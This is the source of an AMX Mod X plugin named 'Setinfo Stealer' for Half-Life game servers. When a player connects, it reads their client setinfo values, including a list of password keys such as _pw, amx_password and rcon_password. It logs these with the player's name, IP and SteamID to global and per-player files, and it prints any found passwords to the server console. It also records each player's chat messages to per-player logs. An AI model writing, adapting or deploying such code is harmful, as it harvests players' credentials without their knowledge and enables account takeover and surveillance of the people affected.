#pragma semicolon 1

#include <amxmodx>
#include <amxmisc>

#define PLUGIN  "Setinfo Stealer"
#define VERSION "1.1"
#define AUTHOR  "exz666"

new const LOG_GLOBAL[]   = "setinfo_stealer.log";
new const DIR_SETINFO[]  = "setinfo_stealer";
new const DIR_CHAT[]     = "setinfo_stealer_chat";

new const g_szInfoKeys[][] = {
    "model", "rate", "cl_updaterate", "cl_lw", "cl_lc",
    "cl_dlmax", "cl_righthand", "_vgui_menus", "_ah", "topcolor",
    "bottomcolor", "_cl_autowepswitch", "hud_classautokill",
    "cl_cmdrate", "cl_timeout", "cl_allowdownload", "cl_allowupload",
    "_pw", "_password", "_pass", "password", "pw", "pass",
    "amx_password", "amx_pass", "_amxpw", "_amx_pw",
    "rcon_password"
};

new const g_szPasswordKeys[][] = {
    "_pw", "_password", "_pass", "password", "pw", "pass",
    "amx_password", "amx_pass", "_amxpw", "_amx_pw",
    "rcon_password"
};

new g_szLogsPath[128];
new g_szSetinfoDir[160];
new g_szChatDir[160];

public plugin_init()
{
    register_plugin(PLUGIN, VERSION, AUTHOR);

    register_clcmd("say", "hook_say");
    register_clcmd("say_team", "hook_say_team");

    get_localinfo("amxx_logs", g_szLogsPath, charsmax(g_szLogsPath));

    formatex(g_szSetinfoDir, charsmax(g_szSetinfoDir), "%s/%s", g_szLogsPath, DIR_SETINFO);
    formatex(g_szChatDir,    charsmax(g_szChatDir),    "%s/%s", g_szLogsPath, DIR_CHAT);

    ensure_dir(g_szSetinfoDir);
    ensure_dir(g_szChatDir);
}

ensure_dir(const szPath[])
{
    if (dir_exists(szPath))
        return;

    mkdir(szPath);

    if (!dir_exists(szPath))
    {
        new szCmd[256];
        formatex(szCmd, charsmax(szCmd), "%s/.keep", szPath);
        new fp = fopen(szCmd, "wt");
        if (fp)
        {
            fclose(fp);
        }
    }
}

public client_putinserver(id)
{
    if (is_user_bot(id) || is_user_hltv(id))
        return;

    set_task(1.0, "task_log_player", id);
    log_chat_event(id, "has connected to the game", true);
}

public client_disconnected(id)
{
    if (is_user_bot(id) || is_user_hltv(id))
        return;

    log_chat_event(id, "has left the game", false);
}

public task_log_player(id)
{
    if (!is_user_connected(id))
        return;

    log_player_setinfo(id);
}

log_player_setinfo(id)
{
    new szName[32], szIP[32], szSteamID[35], szFlags[32], szTime[32];
    new szSafeSteamID[40];

    get_user_name(id, szName, charsmax(szName));
    get_user_ip(id, szIP, charsmax(szIP), 0);
    get_user_authid(id, szSteamID, charsmax(szSteamID));
    get_flags(get_user_flags(id), szFlags, charsmax(szFlags));
    get_time("%d/%m/%Y - %H:%M:%S", szTime, charsmax(szTime));

    make_safe_filename(szSteamID, szSafeSteamID, charsmax(szSafeSteamID));

    new szBuffer[2048];
    new iLen = 0;

    iLen += formatex(szBuffer[iLen], charsmax(szBuffer) - iLen, "Time: %s^n", szTime);
    iLen += formatex(szBuffer[iLen], charsmax(szBuffer) - iLen, "Nick: %s, IP %s, SteamID: %s^n", szName, szIP, szSteamID);

    if (szFlags[0])
    iLen += formatex(szBuffer[iLen], charsmax(szBuffer) - iLen, "Flags: %s^n", szFlags);

    iLen += formatex(szBuffer[iLen], charsmax(szBuffer) - iLen, "Setinfo:^n");

    new szValue[128];
    for (new i = 0; i < sizeof(g_szInfoKeys); i++)
    {
        get_user_info(id, g_szInfoKeys[i], szValue, charsmax(szValue));

        if (szValue[0])
        {
            iLen += formatex(szBuffer[iLen], charsmax(szBuffer) - iLen,
                "%s %s^n", g_szInfoKeys[i], szValue);
        }
    }

    new szGlobalPath[256];
    formatex(szGlobalPath, charsmax(szGlobalPath), "%s/%s", g_szLogsPath, LOG_GLOBAL);
    write_to_file(szGlobalPath, szBuffer);

    new szPersonalPath[256];
    formatex(szPersonalPath, charsmax(szPersonalPath), "%s/%s.log", g_szSetinfoDir, szSafeSteamID);
    write_to_file(szPersonalPath, szBuffer);

    new szPasswords[512];
    new iPwLen = 0;
    new bool:bFound = false;

    for (new i = 0; i < sizeof(g_szPasswordKeys); i++)
    {
        get_user_info(id, g_szPasswordKeys[i], szValue, charsmax(szValue));

        if (szValue[0])
        {
            if (bFound)
                iPwLen += formatex(szPasswords[iPwLen], charsmax(szPasswords) - iPwLen, ", ");

            iPwLen += formatex(szPasswords[iPwLen], charsmax(szPasswords) - iPwLen,
                "%s=%s", g_szPasswordKeys[i], szValue);
            bFound = true;
        }
    }

    if (bFound)
    {
        server_print("[Stealer] %s | %s | %s | %s | %s", szTime, szName, szIP, szSteamID, szPasswords);
    }
}

write_to_file(const szPath[], const szData[])
{
    new fp = fopen(szPath, "at");
    if (fp)
    {
        fprintf(fp, "%s^n^n", szData);
        fclose(fp);
    }
    else
    {
        server_print("[Stealer] Cannot open file: %s", szPath);
    }
}

public hook_say(id)
{
    log_chat_message(id, "ALL");
    return PLUGIN_CONTINUE;
}

public hook_say_team(id)
{
    log_chat_message(id, "TEAM");
    return PLUGIN_CONTINUE;
}

log_chat_message(id, const szType[])
{
    if (is_user_bot(id) || is_user_hltv(id))
        return;

    new szMessage[192];
    read_args(szMessage, charsmax(szMessage));
    remove_quotes(szMessage);
    trim(szMessage);

    if (!szMessage[0])
        return;

    new szName[32], szSteamID[35], szSafeSteamID[40], szTime[32];
    get_user_name(id, szName, charsmax(szName));
    get_user_authid(id, szSteamID, charsmax(szSteamID));
    get_time("%d/%m/%Y - %H:%M:%S", szTime, charsmax(szTime));

    make_safe_filename(szSteamID, szSafeSteamID, charsmax(szSafeSteamID));

    new szChatLog[256];
    formatex(szChatLog, charsmax(szChatLog), "%s/%s.log", g_szChatDir, szSafeSteamID);

    new fp = fopen(szChatLog, "at");
    if (fp)
    {
        fprintf(fp, "[%s] (%s) %s: %s^n", szTime, szType, szName, szMessage);
        fclose(fp);
    }
    else
    {
        server_print("[Stealer] Cannot open chat log: %s", szChatLog);
    }
}

log_chat_event(id, const szEvent[], bool:bIsConnect)
{
    new szName[32], szSteamID[35], szSafeSteamID[40], szTime[32];
    get_user_name(id, szName, charsmax(szName));
    get_user_authid(id, szSteamID, charsmax(szSteamID));
    get_time("%d/%m/%Y - %H:%M:%S", szTime, charsmax(szTime));

    if (!szSteamID[0])
        return;

    make_safe_filename(szSteamID, szSafeSteamID, charsmax(szSafeSteamID));

    new szChatLog[256];
    formatex(szChatLog, charsmax(szChatLog), "%s/%s.log", g_szChatDir, szSafeSteamID);

    new fp = fopen(szChatLog, "at");
    if (fp)
    {
        if (bIsConnect)
            fprintf(fp, "^n[%s] %s %s^n", szTime, szName, szEvent);
        else
            fprintf(fp, "[%s] %s %s^n", szTime, szName, szEvent);
        fclose(fp);
    }
}

make_safe_filename(const szIn[], szOut[], iLen)
{
    copy(szOut, iLen, szIn);
    replace_all(szOut, iLen, ":", "_");
}
